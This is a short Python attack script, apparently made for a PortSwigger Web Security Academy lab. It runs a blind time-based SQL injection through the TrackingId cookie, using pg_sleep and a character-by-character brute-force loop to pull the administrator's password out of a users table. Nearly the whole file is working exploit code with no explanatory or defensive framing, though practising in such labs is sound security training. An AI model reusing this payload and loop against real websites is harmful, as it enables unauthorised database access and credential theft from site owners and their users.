from signal import SIGINT
from pwn import *
import requests, time, pdb, sys, string
import os

def def_handler(sig, frame):
    print("\n\n[!]Saliendo....\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
main_url = "https://0ac7005004e604ad81509e3b002700ac.web-security-academy.net"
characters = string.ascii_lowercase + string.digits

def makeRequest():
    password = ""

    p1 = log.progress("fuerza bruta")
    p1.status("Iniciando ataque...")

    time.sleep(2)

    p2 = log.progress("password")

    for position in range(1, 21):
        for character in characters:
            cookies = {
                'TrackingId': "DKgVXPZXJiVh7gVz'||(select case when substring(password,%d,1)='%s' then pg_sleep(5) else pg_sleep(0) end from users where username='administrator')-- -" % (position, character),
                'session': 'jZOOriDOTgo526ZqXNVLmZUUJzzwOwg0'
            }

            p1.status(cookies['TrackingId'])

            time_start = time.time()

            r = requests.get(main_url, cookies=cookies)

            time_end = time.time()

            if time_end - time_start > 2: # si la pagina fa mes de 5 segons de espera, el caracter o digit es correcte
                password += character
                os.system("cls")
                p2.status(password)
                break


if __name__ == '__main__':

    makeRequest()
